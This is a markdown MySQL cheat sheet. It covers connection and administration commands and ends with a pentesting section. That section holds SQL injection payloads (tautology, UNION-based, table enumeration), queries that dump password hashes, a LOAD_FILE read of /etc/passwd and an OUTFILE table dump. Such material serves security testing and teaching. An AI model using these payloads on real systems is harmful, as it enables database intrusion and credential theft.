# MySQL Cheat Sheet

## Connect to MySQL

### Using command line

```
mysql -u root -p
```

## Connect to a remote server

```
mysql -h <host> -u <user> -p
```

## Basic Commands

### Show all databases

```
SHOW DATABASES;
```

## Use a database
```
USE database_name;
```

## Show all tables

```
SHOW TABLES;
```

## Describe a table

```
DESCRIBE table_name;
```

## Show current user

```
SELECT USER();
```

## User Management

### Show users

```
SELECT user, host FROM mysql.user;
```

## Create a user

```
CREATE USER 'user'@'host' IDENTIFIED BY 'password';
```

## Grant privileges

```
GRANT ALL PRIVILEGES ON dbname.* TO 'user'@'host';
FLUSH PRIVILEGES;
```

## Change root password

```
ALTER USER 'root'@'localhost' IDENTIFIED BY 'newpassword';
```

## Data Extraction (useful in Pentesting)

### Dump all users and password hashes

```
SELECT user, password FROM mysql.user;
```

## Read files from the server (requires FILE privilege)

```
SELECT LOAD_FILE('/etc/passwd');
```

## Common SQL Injection Payloads

### Basic injection

```
' OR '1'='1
```

## Union-based

```
' UNION SELECT null, database(), user(), version() --
```

## Extract table names

```
' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='target_db' --
```

## Dump a Table to File (requires permissions)

```
SELECT * FROM users INTO OUTFILE '/tmp/users.txt';
```




























































